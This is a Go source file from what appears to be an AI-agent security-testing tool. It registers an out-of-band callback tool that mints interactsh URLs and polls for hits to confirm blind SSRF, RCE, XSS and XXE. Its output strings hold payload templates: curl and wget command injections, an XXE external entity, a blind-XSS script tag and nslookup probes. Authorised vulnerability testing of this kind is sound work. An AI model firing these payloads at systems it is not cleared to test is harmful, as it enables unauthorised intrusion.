// Package oob registers the out-of-band (OAST) callback tool. It lets the
// agent mint a unique callback URL, plant it in payloads, and poll for
// interactions — turning blind SSRF/RCE/XSS/XXE into CONFIRMED findings with
// concrete evidence (the target's server actually reached our URL).
package oob

import (
	"fmt"
	"sort"
	"strings"

	oobsrv "github.com/xalgord/xalgorix/v4/internal/oob"
	"github.com/xalgord/xalgorix/v4/internal/tools"
)

// Register adds the oob_callback tool to the registry.
func Register(r *tools.Registry) {
	r.Register(&tools.Tool{
		Name:        "oob_callback",
		Description: "Out-of-band (OAST) callback oracle for CONFIRMING blind vulnerabilities (blind SSRF, blind RCE, blind XSS, XXE, blind SQLi, blind CMDi). Captures DNS, HTTP and SMTP callbacks (via interactsh by default — no server setup needed), so even DNS-only sinks that merely resolve your host are proven. Workflow: (1) action=generate → get a unique callback URL/host; (2) plant it in your payload (an SSRF url param, a command like `curl <url>` or `nslookup <host>`, an XXE SYSTEM entity, a blind-XSS script src); (3) action=poll with the token → any recorded interaction is concrete PROOF the target reached your callback.",
		Parameters: []tools.Parameter{
			{Name: "action", Description: "'generate' to mint a new callback URL (default if omitted), or 'poll' to check for interactions on a token.", Required: false},
			{Name: "token", Description: "For action=poll: the token returned by generate.", Required: false},
		},
		Execute: execute,
	})
}

func execute(args map[string]string) (tools.Result, error) {
	action := strings.ToLower(strings.TrimSpace(args["action"]))
	switch action {
	case "generate", "gen", "new", "":
		url, token, err := oobsrv.Generate()
		host := strings.TrimPrefix(strings.TrimPrefix(url, "https://"), "http://")
		if err != nil {
			return tools.Result{Output: "❌ OOB unavailable: " + err.Error() +
				"\nOOB is not configured on this server. Fall back to in-band verification (differential timing, error-based, or a reflected internal resource like 169.254.169.254 returned BY THE TARGET)."}, nil
		}
		return tools.Result{
			Output: fmt.Sprintf(`✅ OOB callback ready.
Callback URL: %s
Token: %s

Plant the URL in your payload, then poll with this token. Examples:
- SSRF:      set a url/redirect/webhook param to %s
- Blind RCE: inject `+"`curl %s`"+` or `+"`wget %s`"+`
- XXE:       <!ENTITY x SYSTEM "%s">
- Blind XSS: <script src=%s></script>
- DNS-only:  a bare host lookup (e.g. `+"`nslookup %s`"+` or a hostname the target resolves) is also captured and counts as proof.`,
				url, token, url, url, url, url, url, host),
			Metadata: map[string]any{"oob_url": url, "oob_token": token},
		}, nil

	case "poll", "check", "read":
		token := strings.TrimSpace(args["token"])
		if token == "" {
			return tools.Result{Output: "❌ poll requires 'token' (from a previous generate call)."}, nil
		}
		hits := oobsrv.Poll(token)
		if len(hits) == 0 {
			return tools.Result{Output: fmt.Sprintf("No OOB interactions for token %s yet. If you just sent the payload, wait a few seconds and poll again. No callback after several tries = the sink is not reaching us (not blind-exploitable via HTTP egress, or egress is filtered).", token)}, nil
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("✅ %d OOB interaction(s) for token %s — the target REACHED our callback. This is concrete proof of out-of-band exploitation:\n", len(hits), token))
		for i, h := range hits {
			sb.WriteString(fmt.Sprintf("\n[%d] %s %s%s\n    from %s at %s\n    User-Agent: %s\n",
				i+1, h.Method, h.Path, queryStr(h.Query), h.RemoteAddr, h.Time.Format("2006-01-02T15:04:05Z07:00"), h.UserAgent))
			if len(h.Headers) > 0 {
				keys := make([]string, 0, len(h.Headers))
				for k := range h.Headers {
					keys = append(keys, k)
				}
				sort.Strings(keys)
				for _, k := range keys {
					sb.WriteString(fmt.Sprintf("    %s: %s\n", k, h.Headers[k]))
				}
			}
			if strings.TrimSpace(h.Body) != "" {
				sb.WriteString(fmt.Sprintf("    body: %s\n", truncate(h.Body, 500)))
			}
		}
		sb.WriteString("\nUse this (method, source IP, timestamp, headers) as the exploitation_proof in report_vulnerability with verification_method=callback_received.")
		return tools.Result{Output: sb.String(), Metadata: map[string]any{"oob_hits": len(hits)}}, nil

	default:
		return tools.Result{Output: "❌ Unknown action '" + action + "'. Use 'generate' or 'poll'."}, nil
	}
}

func queryStr(q string) string {
	if q == "" {
		return ""
	}
	return "?" + q
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n] + "…"
	}
	return s
}
